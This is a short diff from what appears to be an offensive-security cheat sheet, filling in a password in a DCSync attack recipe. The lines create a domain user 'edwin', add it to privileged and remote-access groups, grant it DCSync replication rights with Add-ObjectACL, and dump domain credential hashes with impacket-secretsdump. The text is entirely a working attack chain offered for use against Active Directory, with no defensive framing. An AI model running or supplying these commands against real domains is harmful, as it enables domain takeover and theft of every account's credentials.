@@ -38,7 +38,7 @@ DCSync:net user edwin P@ssw0rd@123 /add /domain ;
 DCSync:net group "<group with writedacl>" edwin /add ;
 DCSync:net localgroup "Remote Management Users" edwin /add ;
 DCSync:net localgroup "Remote Desktop Users" edwin /add
-DCSync:$password = ConvertTo-SecureString "" -AsPlainText -Force
+DCSync:$password = ConvertTo-SecureString "P@ssw0rd@123" -AsPlainText -Force
 DCSync:$cred = New-Object System.Management.Automation.PSCredential("<domain>\edwin", $password)
 DCSync:Add-objectACL -PrincipalIdentity edwin -Credential $cred -Rights DCSync
 DCSync:impacket-secretsdump '<domain>/edwin'@<target>
